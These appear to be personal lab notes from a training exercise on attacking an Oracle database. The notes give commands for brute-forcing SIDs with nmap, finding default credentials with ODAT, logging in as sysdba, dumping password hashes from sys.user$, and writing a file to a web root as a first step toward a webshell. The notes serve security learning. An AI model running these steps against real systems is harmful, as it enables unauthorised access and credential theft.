...
```shell
nmap -A -p1521 10.129.205.19 --script oracle-sid-brute  
```

![](../../Attachements/Pasted%20image%2020260704121223.png)
#### ODAT
...
```
![](../../Attachements/Pasted%20image%2020260704122157.png)
We found credentials scott:tiger.
Now use SQLPlus to interact with database
...
```
![](../../Attachements/Pasted%20image%2020260704122631.png)

#### SQLplus - Log In
```shell
sqlplus scott/tiger@10.129.204.235/XE
sqlplus scott/tiger@10.129.204.235/XE as sysdba=>gives high privilege
```
![](../../Attachements/Pasted%20image%2020260704123018.png)

SQLPLUS COMMANDS
```shell
select table_name from all_tables;
select * from user_role_privs;
select * from user_role_privs; =>after login in as sysdba gives high previlage
select name, password from sys.user$;
```

### UPLOAD WEBSHELL ON THE SERVER
...
In below command the file to be uploaded: Full path of file to be uploaded was needed.
```shell
echo "Oracle File Upload Test" > testing.txt => create testing file
odat utlfile -s 10.129.205.19 -d XE -U scott -P tiger --sysdba --putFile C:\\inetpub\\wwwroot testing.txt /root/Desktop/HTB/testing.txt
```

![](../../Attachements/Pasted%20image%2020260704132945.png)
